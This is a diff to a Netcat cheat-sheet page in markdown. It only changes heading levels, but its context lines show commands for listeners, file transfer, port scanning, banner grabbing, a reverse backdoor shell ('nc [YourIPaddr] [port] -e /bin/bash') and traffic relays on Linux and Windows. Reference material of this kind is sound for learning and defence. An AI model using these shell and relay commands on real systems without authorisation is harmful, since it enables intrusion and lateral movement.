@@ -22,7 +22,7 @@ nc -l -p [LocalPort]
 {% endhighlight %}
 Create a Netcat listener on arbitrary local port [LocalPort]
 
-### File Transfer
+## File Transfer
 
 #### Push a file from client to listener
 {% highlight bash %}
@@ -46,7 +46,7 @@ nc -w3 [TargetIPaddr] [port] > [outfile]
 {% endhighlight %}
 Connect to [TargetIPaddr] on [port] and retrieve [outfile]
 
-### TCP Port Scanner
+## TCP Port Scanner
 
 #### Port scan an IP Address
 {% highlight bash %}
@@ -58,7 +58,7 @@ sending any data (-z), and waiting no more than 1 second for a connection to occ
 
 The randomized ports (-r) switch can be used to choose port numbers randomly in the range
 
-### TCP Banner Grabber
+## TCP Banner Grabber
 
 #### Grab the banner of TCP services running on an IP address from Linux
 {% highlight bash %}
@@ -73,7 +73,7 @@ Add -r to randomize destination ports within the range
 
 Add -p [port] to specify a source port
 
-### Backdoor Shells
+## Backdoor Shells
 
 #### Listening backdoor shell on Linux
 {% highlight bash %}
@@ -100,7 +100,7 @@ nc [YourIPaddr] [port] -e /bin/bash
 
 Create a reverse shell that will attempt to connect to [YourIPaddr] on a local [port]. This shell can then be captured on local port [port]. This shell can then be captured using a fundamental netcat listener
 
-### Netcat Relays on Linux
+## Netcat Relays on Linux
 To begin, create a FIFO (named pipe) called backpipe:
 {% highlight bash %}
 cd /tmp
@@ -130,7 +130,7 @@ nc [PreviousHopIPaddr] [port] 0<backpipe | [NextHopIPaddr] [port2] | tee backpip
 
 Create a relay that sends packets from the connection to [PreviousHopIPaddr] on port [port] to a Netcat client connected to [NextHopIPaddr] on port [port2]
 
-### Netcat Relays on Windows
+## Netcat Relays on Windows
 To begin, enter a temporary directory where we will create .bat files:
 {% highlight bash %}
 cd c:\temp
@@ -163,7 +163,7 @@ nc [PreviosHopIPaddr] [port] -e relay.bat
 Create a relay that will send packets from the connection to [PreviousHopIPaddr]
 on port [port] to a Netcat Client connected to [NextHopIPaddr] on port [port2]
 
-### Netcat Command Flags
+## Netcat Command Flags
 {% highlight bash %}
 nc [options] [TargetIPaddr] [ports(s)]
 {% endhighlight %}
